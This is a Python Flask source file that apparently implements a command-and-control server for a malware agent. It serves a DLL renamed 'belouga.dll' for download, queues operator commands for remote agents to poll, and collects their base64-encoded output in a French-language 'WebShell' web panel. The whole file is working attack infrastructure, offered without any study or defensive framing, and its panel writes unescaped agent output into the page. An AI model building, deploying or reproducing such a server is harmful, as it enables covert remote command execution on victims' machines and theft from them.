from flask import Flask, request, jsonify, send_file, render_template_string
from flask_cors import CORS
import base64

app = Flask(__name__)
CORS(app)

commands = []
outputs = []

@app.route('/getDLL', methods=['GET'])
def get_dll():
    return send_file("./agent.dll", mimetype="application/octet-stream", as_attachment=True, download_name="belouga.dll")

@app.route('/command', methods=['GET', 'POST'])
def command():
    if request.method == 'GET':
        command =  jsonify(commands), 200
        commands.clear()
        return command

    elif request.method == 'POST':
        data = request.get_json()
        if not data or 'command' not in data:
            return jsonify({'error': 'Missing command'}), 400
        commands.append(data['command'])
        return jsonify({'status': 'Command added'}), 201

@app.route('/output', methods=['POST'])
def receive_output():
    data = request.get_data(as_text=True)
    data = base64.b64decode(data)
    if not data:
        return jsonify({'error': 'No output received'}), 400
    outputs.append(data.decode('latin-1'))
    return jsonify({'status': 'Output received'}), 200

@app.route('/clear_outputs', methods=['POST'])
def clear_outputs():
    outputs.clear()
    return jsonify({'status': 'Outputs cleared'}), 200

@app.route('/')
def index():
    html = """
    <!DOCTYPE html>
    <html lang="fr">
    <head>
      <meta charset="UTF-8">
      <title>WebShell Interface</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 2em; }
        input, button { padding: 0.5em; margin-top: 0.5em; }
        #outputs { margin-top: 2em; background: #f0f0f0; padding: 1em; border-radius: 8px; }
        #buttons { margin-top: 1em; }
      </style>
    </head>
    <body>
      <h1>WebShell Command Interface</h1>
      <input type="text" id="commandInput" placeholder="Entrez une commande..." style="width: 70%;">
      <button onclick="sendCommand()">Envoyer</button>
      <div id="buttons">
        <button onclick="clearOutput()" style="background: #ffaaaa;">🧹 Clear Output</button>
      </div>

      <div id="outputs">
        <h3>Résultats :</h3>
        <div id="outputContainer"><em>En attente...</em></div>
      </div>

      <script>
        const apiCommand = '/command';
        const apiOutput = '/output';

        function sendCommand() {
          const input = document.getElementById('commandInput');
          const command = input.value.trim();
          if (!command) return alert("Commande vide.");
          fetch(apiCommand, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ command })
          }).then(() => {
            input.value = '';
          });
        }

        function loadOutputs() {
          fetch('/outputs')
            .then(res => res.json())
            .then(data => {
              const container = document.getElementById('outputContainer');
              if (data.length === 0) {
                container.innerHTML = "<em>Aucun résultat reçu.</em>";
              } else {
                container.innerHTML = data.map(o => `<pre>${o}</pre>`).join('');
              }
            });
        }

        function clearOutput() {
          fetch('/clear_outputs', { method: 'POST' })
            .then(() => {
              document.getElementById('outputContainer').innerHTML = "<em>Sortie effacée.</em>";
            });
        }

        setInterval(loadOutputs, 1000);
        window.onload = loadOutputs;
      </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/outputs', methods=['GET'])
def get_outputs():
    return jsonify(outputs), 200

if __name__ == '__main__':
    app.run(debug=False)
